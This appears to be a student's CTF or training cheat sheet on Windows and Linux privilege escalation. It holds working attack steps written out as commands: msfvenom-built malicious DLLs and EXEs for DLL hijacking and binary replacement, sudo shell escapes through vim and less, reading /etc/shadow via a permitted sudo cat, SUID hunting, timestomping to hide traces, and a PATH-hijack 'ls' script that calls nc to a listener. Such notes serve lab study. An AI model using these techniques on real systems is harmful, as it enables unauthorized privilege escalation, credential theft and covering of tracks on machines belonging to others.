Windows: 

DLL Search Order (IMPORTANT for CTF):
	
	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
	
	The directory the the Application was run from
	
	The directory specified in in the C+ function GetSystemDirectory()
	
	The directory specified in the C+ function GetWindowsDirectory()
	
	The current directory

Checking UAC Settings:
	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

command to check:
	net use z: "\\http://live.sysinternals.com" /persistent:yes

Scheduled Tasks and Services:

	schtasks /query /fo LIST /v

	Write Permissions

    Non-Standard Locations

    Unquoted Executable PathsVpej6eaoK2sy2ak

    Vulnerabilities in Executables

    Permissions to Run As SYSTEM

DLL Hijacking:
	
	(1) open services find one that is vulnerable 
	(2) test if you can right to the directory by creating a text file (if you can only rename the .exe, go to lower steps)
	(3) to find the dlls the .exe calls on open procmon.exe in the mapped drive
	might have to swap with 5 (4) add the filters Process Name contains <name of .exe>, Path contains .dll, Result is NAME NOT FOUND
	(5) Reboot the machine 
	(6) Pick any of the .dlls
	(7) on the linux machine run msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\<username>\Desktop\whoami.txt' -f dll > SSPICLI.dll
	(8) from windows scp the dll over from the linux EX: scp student@10.50.33.204:/home/student/SSPICLI.dll "C:\Program Files (x86)\Putty\SSPICLI.dll" 
	(9) run the program

EXE Replacment:
	
	(1) Rename the executable 
	(2) msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f exe > putty.exe
	(3) scp the file into the same file as the application



Audit Logging: auditpol /get /category:*


Linux:

	sudo -l shows you what you are allowed to sudo 
	/etc/groups /etc/passwd 
	suid sgid 

	sudo vim /filename  then when you are in the file : !sh

	sudo less /filename then when you are looking at th file : !sh 
	
	https://gtfobins.github.io shows the diffrent bianaries that you can open a shell with 
	(1) (2)  (3)  (4)
	ALL=(ALL:ALL)ALL
	on all hosts (1) any user in group(2) can sudo as all users in the group(3) to execute all commands (4)

    use this to find what files have the suid bit turned on 
	find / -type f -perm /4000 -ls 2>/dev/null
	use this to see if the sgid is turned on 
	find / -type f -perm /2000 -ls 2>/dev/null
	use this to see both
	find / -type f -perm /6000 -ls 2>/dev/null

	cat /etc/crontab system level cronjobs	
	cat /etc/cron.hourly.daily,weekly,monthly
	cat /var/spool/cron/crontab user level cronjobs
	showed all of the world writable directories
	find / -type d -perm /2 2>/dev/null

	ls -latr give listing of files in the order of which they were modified

	timestomping 
	touch -c -t 201603051015 1.txt   # Explicit
    touch -r 3.txt 1.txt    # Reference

	(1) see what is possible sudo -l
	(2) go to gtfobins to see if you can abuse the sudo command
	(3) break out using whatever technique to get a shell

	(1) sudo -l if you can cat a specific file if its like var/syslog* 
	(2) then add whatever fill you want behiend EX. cat /var/sysylog1 /etc/shadow

	(1) find / -type f -perm /4000 -ls 2>/dev/null find the suid	
	(2) cross refrence your findings with gtfobins suid filter
	(3) use this to escalte perms and open a shell 

	(1) create a file at the tmp files called ls 
	(2) inside wrtie #!/bin/bash 
		nc 127.0.0.1 3333
	(3) chmod +x the file
	(4) on your machine crate a listening port on the same port
	(5) run the script on the remote machine
